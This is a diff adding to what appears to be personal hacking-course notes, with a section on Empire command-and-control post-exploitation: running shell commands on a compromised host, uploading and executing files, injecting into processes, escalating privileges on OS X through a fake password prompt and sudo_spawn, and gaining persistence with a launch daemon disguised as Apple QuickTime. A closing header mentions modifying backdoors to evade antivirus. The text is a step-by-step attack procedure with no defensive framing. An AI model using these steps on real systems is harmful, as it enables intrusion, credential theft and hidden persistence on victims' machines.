@@ -727,8 +727,55 @@ When we get a shell
 - Terminal 1
 agents
 interact xxxxx
-
 ```
+
+Post Explotation using empire:
+```
+info
+help
+shell 
+*or
+shell sysinfo
+shell ipconfig
+download file.txt
+upload /path/file.exe
+shell ./file.exe
+```
+go to var/lib/powershell-empire/downloads and the session name to see the download  
+
+Modules:  
+```
+usemodules (clik TAB * 2) to see list
+ps (to see all proceses)
+usemodules managment/psinject
+- info
+- set ProcId (nº proces to migrate)
+- set Listener (name)
+- execute
+```
+2 Methods to Escalating Privileges On OS X
+```
+usemodules collection/osx/prompt
+- execute
+- back
+usemodules privesc/multi/sudo_spawn
+- set Listener (name)
+- set Password (password)
+- execute
+```
+change to new agent and run sysinfo or whoami to check if it work  
+
+Maintaining Access On OS X
+```
+usemodules persistence/osx/launchdaemonexecutable
+- info
+- set DeamonLocation /Library/Application Support/QuicktimeDaemon
+- set Listener (Name)
+- set DeamonName com.apple.QuickTime
+- info 
+- execute
+```
+change to new agent
 
 ## Modifying Backdoor Source To Bypass All Anti-virus Programs
 for the .bat backdors generated whit fatrat and empire (Dos and powershell code)  
